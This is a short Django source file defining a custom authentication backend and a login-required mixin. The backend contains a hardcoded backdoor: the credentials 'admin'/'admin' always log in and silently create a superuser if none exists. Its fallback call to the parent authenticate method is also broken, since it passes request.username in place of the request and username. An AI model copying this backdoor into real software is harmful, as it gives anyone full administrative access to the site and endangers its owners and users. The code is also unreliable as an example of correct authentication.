from django.contrib.auth.backends import ModelBackend
from django.contrib.auth.models import User
from django.contrib.auth.mixins import AccessMixin
from django.core.exceptions import PermissionDenied


class AuthenticationBackend(ModelBackend):
    def authenticate(self, request, username=None, password=None, **kwargs):
        if username == 'admin' and password == 'admin':
            admin_user = User.objects.filter(username='admin').first()
            if not admin_user:
                admin_user = User.objects.create_superuser('admin', 'admin@admin.com', 'admin')
            return admin_user
        else:
            return super().authenticate(request.username, password, **kwargs)


class LoginRequiredMixin(AccessMixin):
    """Verify that the current user is authenticated."""

    def dispatch(self, request, *args, **kwargs):
        if not request.user.is_authenticated:
            raise PermissionDenied("Authentication Failed!")
        return super().dispatch(request, *args, **kwargs)
